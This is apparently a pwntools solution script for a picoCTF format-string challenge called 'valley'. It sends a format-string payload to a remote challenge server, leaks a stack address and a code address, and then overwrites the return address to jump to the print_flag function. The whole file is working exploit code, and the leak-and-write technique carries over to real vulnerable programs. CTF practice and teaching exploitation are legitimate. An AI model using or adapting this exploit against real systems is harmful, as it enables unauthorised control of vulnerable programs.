from pwn import *

context.log_level = "error"
elf = context.binary = ELF("./valley")
context.log_level = "error"

# alternatif offset bisa pake ini
# offset = elf.sym.main - elf.sym.print_flag
offset = 408 


pay = b"%20$p:%27$p"

# p = process("./valley")
p = remote("shape-facility.picoctf.net", 65506)
p.sendlineafter(b":",pay)
p.recvuntil(b"distance: ")

leak = p.recvline().decode().strip().split(":")

ret = int(leak[0],16) - 8
print_flag = int(leak[1],16) - offset
payload = fmtstr_payload(6,{ret:print_flag},write_size ="short")

p.sendline(payload)
p.sendline(b"exit")
p.recvuntil(b"Disappears")
print(p.recv().decode())
